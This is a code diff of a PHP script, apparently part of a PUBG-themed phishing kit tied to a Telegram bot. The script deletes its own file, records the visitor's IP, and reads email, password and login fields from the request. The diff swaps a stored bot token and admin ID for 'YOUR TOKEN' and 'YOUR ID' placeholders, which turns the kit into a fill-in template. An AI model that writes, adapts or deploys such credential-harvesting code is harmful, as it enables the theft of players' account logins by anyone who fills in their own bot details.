@@ -1,8 +1,7 @@
 <?php
 unlink('pubg.php');
 ob_start();
-$info = json_decode(file_get_contents('Sha_My.json'),1);
-$API_KEY = $info[info]['token'];
+$API_KEY = "YOUR TOKEN";
 
 define('API_KEY',$API_KEY);
 function bot($method,$datas=[]){
@@ -10,9 +9,6 @@ function bot($method,$datas=[]){
         $url = "https://api.telegram.org/bot".API_KEY."/".$method."?$tbbots";
         $ttktt = file_get_contents($url);
         return json_decode($ttktt);
-}
-function save($array){
-    file_put_contents('Sha_My.json', json_encode($array));
 }
     if(!empty($_SERVER['HTTP_CLIENT_IP'])){
         $ip = $_SERVER['HTTP_CLIENT_IP'];
@@ -37,7 +33,7 @@ $message_id = $update->callback_query->message->message_id;
 $data = $update->callback_query->data;
 $user = $message->from->username;
 
-$admin = $info[info]['id'];
+$admin = "YOUR ID";
 $email = $_GET["email"];
 $password = $_GET["password"];
 $login = $_GET["login"];
